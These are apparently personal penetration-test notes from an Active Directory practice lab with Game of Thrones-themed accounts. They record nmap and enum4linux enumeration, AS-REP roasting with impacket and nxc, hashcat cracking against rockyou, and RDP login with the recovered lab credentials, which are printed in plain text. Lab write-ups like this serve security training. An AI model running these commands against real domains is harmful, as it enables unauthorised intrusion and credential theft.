User Enum:
```
nmap -sC -sV -Pn -p- -oA nmap_full_scan.txt 10.2.10.10-12,22-23
```

enum4linux again .11
```
enum4linux 10.2.10.11 >> enum4linux-11.txt
```

Found creds:
```
index: 0x18af RID: 0x45f acb: 0x00000210 Account: samwell.tarly	Name: (null)	Desc: Samwell Tarly (Password : Heartsbane)
```

Users:
```
Guest
arya.stark
sansa.stark
brandon.stark
rickon.stark
hodor
jon.snow
samwell.tarly:Heartsbane
jeor.mormont
sql_svc:YouWillNotKerboroast1ngMeeeeee

Creds:
brandon.stark:iseedeadpeople
robb.stark:sexywolfy
```

ASRep

Add to host file:
```bash
10.2.10.11	north.sevenkingdoms.local sevenkingdoms.local
```

Run:
```bash
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip 10.2.10.11 sevenkingdoms.local/ -format hashcat -outputfile hashes.asreproast

# Or Run:
nxc ldap 10.2.10.11 -u usernames.txt  -p '' --asreproast nxc-ldap-output.txt
```

Cracking the HASHes:
```
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt 
```

Creds:
```
brandon.stark:iseedeadpeople
```

RDP to box:
```
xfreerdp /v:10.2.10.11 /u:brandon.stark /p:iseedeadpeople /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
```

Checking users and groups:
Once RDP'ed to the box, run:
```bash
net user
net user brandon.stark

# There is a "Stark" group, so lets see all the members:
net group Stark
```